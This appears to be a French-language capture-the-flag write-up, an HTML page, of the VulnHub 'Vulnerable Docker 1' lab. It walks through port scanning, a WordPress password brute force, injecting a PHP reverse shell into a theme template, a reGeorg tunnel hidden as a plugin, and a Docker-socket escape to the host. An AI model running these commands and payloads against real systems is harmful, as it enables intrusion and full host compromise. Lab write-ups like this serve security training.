<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/themes/prism.min.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/components/prism-bash.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">

    <script defer src="https://cdn.jsdelivr.net/npm/particles.js"></script>

    <script defer src="./../write_up.js"></script>

    <title>Write Up</title>
    <link rel="stylesheet" href="./../write_css.css">
    <link rel="stylesheet" href="./../wu/style_vulnDocker.css">
</head>


<body>
    <nav class="navbar navbar-dark bg-dark fixed-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">L2zCore</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas"
                data-bs-target="#offcanvasDarkNavbar" aria-controls="offcanvasDarkNavbar"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="offcanvas offcanvas-end text-bg-dark" tabindex="-1" id="offcanvasDarkNavbar"
                aria-labelledby="offcanvasDarkNavbarLabel">
                <div class="offcanvas-header">
                    <h5 class="offcanvas-title" id="offcanvasDarkNavbarLabel">L2zCore</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas"
                        aria-label="Close"></button>
                </div>
                <div class="offcanvas-body">
                    <ul class="navbar-nav justify-content-end flex-grow-1 pe-3">
                        <li class="nav-item">
                            <a class="nav-link active" aria-current="page" href="#">Write Up</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./../../portfolio.html">Portfolio</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./../../cv/cv.html">Cv</a>
                        </li>
                    </ul>

                </div>
            </div>
        </div>
    </nav>
    <!-- Animation Background -->
    <div id="particles-js"></div>
    <div class="centered-content container">
        <h1>Vulnérable Docker 1 </h1>
        <p>Write up d'une machine Docker vulnhub</p>
        <section class="content">
            <div class="row">
                <div class="dir">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="./../write_up.html">home</a></li>
                            <li class="breadcrumb-item"><a href="./../write_up.html">lenzzair</a></li>
                            <li class="breadcrumb-item"><a href="./../write_up.html">Write Up</a></li>
                            <li class="breadcrumb-item active" aria-current="page">Vulnérable_Docker1</li>
                        </ol>
                    </nav>

                </div>
            </div>
        </section>

        <section>
            <h2>Vulnerable Docker: 1 </h2>

            <div class="row">

                <div class="col">
                    <p>Difficulté: Easy <i class="bi bi-circle-fill" style="color: green;"></i></p>
                    <p>Difficulté: Hard <i class="bi bi-circle-fill" style="color: red;"></i></p>
                </div>

                <div class="col">
                    Outils utilisé:
                    <ul>
                        <li><a href="https://www.kali.org/tools/netdiscover/">netdiscover</a></li>
                        <li><a href="https://www.kali.org/tools/nmap/">nmap</a></li>
                        <li><a href="https://www.kali.org/tools/wpscan/">wpscan</a></li>
                        <li><a
                                href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell
                                github</a></li>
                        <li><a
                                href="https://excalidraw.com/mon-schema#json=8ZFw9mvc1Ze-HzG5BnrOG,1fjAGl0P9Y39ytEeAlca7g">Excalidraw
                                schema perso docker</a></li>
                        <li><a href="https://github.com/sensepost/reGeorg">reGeorg</a></li>
                    </ul>
                </div>
            </div>

            <section class="etape1 mt-5">
                <h2 class="--bs-primary-text-emphasis">Etape 1: Net Discover </h2>

                <p class="para">Utilisation de l’outils <strong>netdiscover</strong> ( <a
                        href="https://www.kali.org/tools/netdiscover/"> Kali Linux netdiscover | Kali Linux Tools </a>)
                    pour pouvoir
                    récupérer l’adresse ip de la machine cible.</p>

                <img src="./img/netdiscover_vd.png" class="img-fluid" alt="Résultat du scan netdiscover">
            </section>
        </section>

        <section class="etape2 mt-5">
            <h2 class="--bs-primary-text-emphasis">Etape 2: Scan de port sur la machine cible</h2>

            <p class="para mt-5">
                Je vais utiliser maintenant l’outils nmap (<a href="https://www.kali.org/tools/nmap/"> Kali Linux nmap |
                    Kali Linux Tools</a> ) qui me permettre de
                lister
                les ports ouverts mais aussi les version de certains protocoles qui pourront m’aider a trouver certaine
                vulnérabilité.
            </p>


            <pre><code class="language-bash mt-5">
sudo nmap -sV -sC -O -T5 -p- -oN discover.txt 192.168.56.104

# -sV  -> Récupère la version des services
# -sC  -> Utilise les scripts nmap nse (utilisés pour détecter des vulnérabilités sur les ports)
# -O   -> Détection de l'OS
# -p-  -> Test tous les ports
# -oN  -> Écrit le résultat dans output.txt
                </code></pre>

            <p class="mt-5">! le port 2375 est ouvert que pour le mode esay ! </p>
            <img src="./img/nmap_vd.png" class="img-fluid mt-5">

            <table class="table table-dark mt-5">
                <thead>
                    <tr>
                        <th scope="col">Port</th>
                        <th scope="col">Service</th>
                        <th scope="col">Description</th>
                        <th scope="col">Status</th>
                        <th scope="col">Details</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <th scope="row">22</th>
                        <th>ssh</th>
                        <th>OpenSSH</th>
                        <th>Open</th>
                        <th></th>
                    </tr>
                    <tr>
                        <th scope="row">8000</th>
                        <th>http</th>
                        <th>Apache httpd</th>
                        <th>Open</th>
                        <th>On peux remarqué que wordpress est utilisé</th>
                    </tr>
                    <tr>
                        <th scope="row">2375</th>
                        <th>dockerd</th>
                        <th>Api Docker</th>
                        <th>Open</th>
                        <th>daemon Docker (only easy)</th>
                    </tr>
                </tbody>
            </table>

            <fieldset>
                <legend><i class="bi bi-exclamation-triangle" style="color: yellow;"></i></legend>
                <h3 style="color: red;">Le port 2375:</h3>

                <ul>
                    <li class="li-title"><strong>Rôle:</strong></li>
                    <ul>
                        <li>Docker expose une API appelée *Docker Remote API* qui permet de contôler le daemon Docker a
                            <strong>DISTANCE</strong>
                        </li>
                    </ul>
                    <li class="li-title"><strong>Protocole:</strong></li>
                    <ul>
                        <li>Fonctionne avec TCP</li>
                    </ul>
                    <li class="li-title"><strong>Risque spécifique:</strong></li>
                    <ul>
                        <li>Un attaquant qui accède à ce port peut envoyer des commandes Docker via l’api pour
                            récupéré des informations sur se que fait tourner le service docker de l’hôte
                        </li>
                    </ul>
                </ul>
            </fieldset>
        </section>

        <section class="mt-5">
            <h2 class="mt-5">Etape 3: Docker Recon (Optionnel → Mode easy)</h2>

            <p class="para">Je vais donc utilisé cette API Docker pour pouvoir récupérer des information sur le docker (
                on peut récupéré le flag final avec cette commande
                <span style="color: red;">
                    docker -H tcp://192.168.56.104:2375 run --rm -it -v
                    /:/host wordpress chroot /host bash
                </span>

                que pour le mode easy mais je l’utilise ce port pour comprendre
                toute l’infra Docker qui tourne )
            </p>

            <pre><code class="language-bash"> 
┌──(kali㉿kali)-[~]
└─$ docker -H tcp://192.168.56.104:2375 image ls
            </code></pre>

            <fieldset>
                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
                <p class="para">
                    <span style="color: green;">-H / - -host</span> → Spécifie l’hôte où le client docker doit se
                    connecter<br><br>

                    <span style="color: green;">tcp://192.168.56.104:2375</span> → Définie l’@IP de l’hôte avec le n° de
                    port<br><br>

                    <span style="color: green;">image ls</span> → Commande Docker qui liste les images disponible sur
                    l’hôte
                </p>
            </fieldset>
            <p class="para">-> Résultat: (étape complète sur mon <a href="https://github.com/lenzzair/Write-Up">github
                    )</a> </p>

            <table class="table table-dark mt-5">
                <thead>
                    <tr>
                        <th scope="col">REPOSITORY</th>
                        <th scope="col">TAG</th>
                        <th scope="col">IMAGE ID</th>
                        <th scope="col">COMMENTAIRE</th>

                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <th>wordpress</th>
                        <th>latest</th>
                        <th>c4260b289fc7</th>
                        <th>Hébèrege un service wordpress, lié avec le port 8000 apache ouvert </th>

                    </tr>
                    <tr>
                        <th>mysql</th>
                        <th>5.7</th>
                        <th>c73c7527c03a</th>
                        <th></th>
                    </tr>
                    <tr>
                        <th>jeroenpeeters/docker-ssh</th>
                        <th>latest</th>
                        <th>7d3ecb48134e</th>
                        <th>Cette syntaxt de réposite est liée a un conteneur sur DockerHub</th>
                    </tr>
                </tbody>
            </table>

            <h3 class="mt-5">Schéma de l'infra Docker qui tourne sur la machine cible</h3>

            <img src="./img/infra_docker_vd.png" class="img-fluid">
        </section>

        <section class="mt-5">
            <h2 class="my-5">Etape 3 :Scan wpscan sur le service wordpress</h2>

            <pre class="mt-5"><code class="language-bash">
wpscan  --url http://192.168.56.104:8000 -e u,p
            </code></pre>

            <ul>
                <li class="li-title">-e</li>
                <ul>
                    <li>u <i class="bi bi-arrow-right"></i> Énumère les utilisateurs WordPress</li>
                    <li>p <i class="bi bi-arrow-right"></i> Enumère les plugins installés pour vérifier leur présence et
                        détecter ceux qui pourraient être vulnérable</li>

                </ul>
            </ul>

            <img src="./img/result_wp_vd.png" class="img-fluid" alt="Resultat du scan wordpress">

            <fieldset>
                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
                <p>Wpscan nous trouve un utilisateur = bob

                    prochaine étape: wpscan peut aussi brute force les mots de passe d’utilisateur définie</p>
            </fieldset>

            <pre class="mt-5"><code class="language-bash">
wpscan --url http://192.168.56.104:8000 -U bob -P /usr/share/wordlist/rockyou.txt
            </code></pre>

            <p class="para">Et nous obtenons le login /mdp</p>

            <fieldset>
                <legend><i class="bi bi-check-lg" style="color: green;"></i></legend>
                <span class="li-title"><strong>bob / Welcom1</strong></span>
            </fieldset>

            <p class="para">Nous voila sur la page admin du WordPress et nous obtenons nôtre premier flag ( easy )

                <span style="color: red;">flag_1{2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998}</span>
            </p>


        </section>

        <section>
            <h2>Etape 5 : Injecter une backdoor dans le wordpress</h2>

            <p class="para">Pour sa nous allons modifier le code
                <? php ?> dans la sidebarre →Appearance→Editor→404Template par une un reverse shell php file qu’on
                récupère sur github
            </p>

            <img src="./img/inject_php_vd.png" class="img-fluid" alt="image injection reverse shell wp">
            <p class="my-5">Nous avons plus qu’a écouter sur le port 4444 et lance la page où est upload le reverse
                shell</p>
            <img src="./img/shell_nc_vd.png" class="img-fluid" alt="resultat nc listening">

            <fieldset>
                <legend><i class="bi bi-exclamation-triangle" style="color: yellow;"></i></legend>
                <p class="mx-5">Au final on retrouve rien d’intéressant sur le conteneur wordpress ( le shell est utile
                    si on utilise protfwd avec metasploit ) </p>
            </fieldset>
        </section>

        <section class="etape4">
            <h2 class="my-5">Etape 4 : Tunneling and cross protocole </h2>

            <ol>
                <li>Récupéré le projet Regeorg sur github
                    <ul>
                        <li>
                            <pre><code class="language-bash">┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/sensepost/reGeorg.git</code></pre>
                        </li>
                    </ul>
                </li>

                <li>Prépare la charge utile
                    <ul>
                        <li>Création d’un fichier d’en-tête WordPress puis on rajoute le scipt tunnel de regeorg</li>
                        <li>
                            <pre><code class="language-bash">
    ─$ cat <<-'EOF' >tunnel/head.php
    <?php
    /*
    * Plugin Name: tunnel
    * Version: 1.0.00
    * Author: Anonymous
    * Author URI: http://anonymous.com
    * License: GPL2
    */
    ?>
    
    EOF
                    
    $ cat tunnel/tunnel.php >> tunnel/head.php
    $ mv tunnel/head.php tunnel.php
    $ zip -r -9 tunnel.zip tunnel
                                
                                </code></pre>
                        </li>
                    </ul>
                </li>

                <li>On ajoute notre charge en tant que plugin wordpress <ul>
                        <li><img src="./img/wp_plugin_vd.png" class="img-fluid my-5" alt="img plugin"></li>
                        <li><img src="./img/activation_plugin_vd.png" class="img-fluid" alt="activation plugin"></li>
                    </ul>
                </li>

                <li>Lancer le script regeorg et activation du proxy local <ul>
                        <li>
                            <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.56.104:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>
                        </li>
                    </ul>
                </li>

                <li><strong>Fonctionnement du tunnel avec le protocole SOCKS5</strong>
                    <ol>
                        <li><strong>Etape 1:</strong>
                            <ul>
                                <li>Générer une trame ssh avec comme IP Dest celle du conteneur cible qui nous est pas
                                    accessible de base, et l’envoyer a nôtre proxy qui est lier a nôtre tunnel.php</li>
                            </ul>
                        </li>
                        <li><strong>Etape 2 :</strong>
                            <ul>
                                <li>Le protocole SOCKS 5 que utilise le script Regeorg encapsule le paquet ssh précédant
                                    par SOCKS 5</li>
                            </ul>
                        </li>

                        <li><strong>Etape 3 :</strong>
                            <ul>
                                <li>Le script Regeorg envoie une requête HTTP POST a tunnel.php avec les donnée SOCKS 5
                                    a l’intérieur donc sont encore encapsuler par HTTP</li>
                            </ul>
                        </li>
                        <li><strong>Etape 4 :</strong>
                            <ul>
                                <li>Le plugin tunnel.php qui est sur le serveur désencapsule le paquet HTTP et exécutes
                                    les instruction SOCK 5 se qui crée une connexion avec la cible et transfère ensuite
                                    les données encapsulées à travers cette connexion.
                                </li>
                            </ul>
                        </li>
                        <li><strong>Etape 5 :</strong>
                            <ul>
                                <li>Le plugin agit agit aussi comme un proxy:
                                    <ul>
                                        <li>Il lit les réponses provenant de la cible</li>
                                        <li>Il réencapsule ces réponses dans un format SOCKS 5</li>
                                        <li>Il les renvoie via HTTP au proxy côté de l’attaquant </li>
                                    </ul>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <img src="./img/schema_SOCKS_vd.png" class="img-fluid" alt="schema protocole SOCKS5">
                </li>


            </ol>
        </section>

        <section>
            <h2>Activation Regeorg</h2>

            <p>Nous allons utiliser la commande suivante pour activer le tunnel regeorg sur nôtre interface local</p>
            <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.1.15:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>

            <img src="./img/resultat _ssh_conteneur_vd.png" class="img-fluid my-5" alt="resultat du ssh">

        </section>

        <section>
            <h2>Pivot Docker</h2>

            <fieldset>
                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
                <p>On peut remarquer que se conteneur a accès a <span class="semi-code"> /var/run/docker.sock </span>
                    qui est utilisé pour communiquer
                    avec l’API Docker donc peut interagir avec le démon Docker de l’host.

                    → Le mode easy permet de communiquer directement avec cette API</p>
            </fieldset>

            <ul>
                <li>L’objectif maintenant est d’installer le client docker sur le conteneur pour pouvoir exécuter des
                    commande docker via l’API</li>
                <li>Sachant que scp est désactiver j’installe netcat et wget sur le conteneur
                    <ul>
                        <li>
                            <pre><code class="language-bash">apt-get update
apt-get install netcat
apt-get install wget</code></pre>
                        </li>
                    </ul>
                </li>
                <li>J’installe aussi le client docker sur ma machine et je la zip
                    <ul>
                        <li>
                            <pre><code class="language-bash">mkdir docker_deb/
cd docker_deb/
apt download docker-ce
apt depends -i docker-ce | awk '{print $2}' | xargs apt download
tar cvzf ../docker.tar.gz .</code></pre>
                        </li>
                    </ul>
                </li>
                <li>J’ouvre un server web avec python sur ma machine et je récupère le zip sur le conteneur
                    <ul>
                        <li><img src="./img/wget_docker_ci_vd.png" class="img-fluid" alt="image"></li>
                    </ul>
                </li>
                <li>Je dézip docker.tar.gz
                    <ul>
                        <pre><code class="language-bash">tar xvzf docker.tar.gz
dpkg -i *.deb</code></pre>
                    </ul>
                </li>
            </ul>

            <p class="my-5">On peut enfin utiliser une commande docker qui permet de prendre le contrôle totale de
                l’hôte via un conteneur </p>

            <h4>Principe:</h4>
            <ul>
                <li>Exécuter une commande docker a distance via l’API Docker</li>
                <li>Lancer un nouveau conteneur via une image existante</li>
                <li>Montage du système de fichiers: monte le système de fichier racine de l’hôte dans ce nouveau
                    conteneur</li>
                <li>Prendre le contrôle totale de ce conteneur et donc a tous les fichier de l’hôte </li>
            </ul>

            <pre><code class="language-bash">docker -H unix:///var/run/docker.sock run --rm  -it -v /:/host wordpress chroot /host bash</code></pre>

            <fieldset class="fieldset_finale">
                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>

                <ol>
                    <li><span class="semi-code"> docker -H unix:///var/run/docker.sock </span>
                        <ol>
                            <li><span style="color: red;">docker</span> : ligne de commande pour interagir avec Docker
                            </li>
                            <li><span style="color: red;">-H unix:///var/run/docker.sock </span>: Spécifique le socket
                                Unix a utiliser pour communiquer avec le démon Docker </li>
                        </ol>
                    </li>
                    <li><span style="color: red;">run</span>
                        <ol>
                            <li>Lance un nouveau conteneur a partir de l’image qui est utiliser pour le wordpress</li>

                        </ol>
                    </li>
                    <li><span style="color: red;">-it</span>
                        <ol>
                            <li>-i : Interactif</li>
                            <li>-t : Alloue un pseudo terminal pour qu’on puisse interagir avec le conteneur</li>
                        </ol>
                    </li>
                    <li><span style="color: red;">-v /:/host</span>
                        <ol>
                            <li>Mount le système de fichier (/) de l’hôte dans le conteneur sous le chemin /host</li>
                        </ol>
                    </li>
                    <li><span style="color: red;">wordpress</span>
                        <ol>
                            <li>chroot /host bash
                                <ol>
                                    <li>chroot : Change Root Directory. Change le répertoire racine pour /host</li>
                                    <li>bash : Ouvre un shell interactif dans cet environnement </li>
                                </ol>
                            </li>
                        </ol>
                    </li>
                </ol>
            </fieldset>

            <p class="my-5">Et on obtiens le flag en hard {d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6}</p>
            
            <img src="./img/flag_finale_vd.png" class="img-fluid" alt="image finale">
        </section>

        <h4>Merci pour vôtre lecture !</h4>
        <p>La write up disponible aussi sur mon <a href="https://github.com/lenzzair/Write-Up">github</a> </p>
    </div>


</body>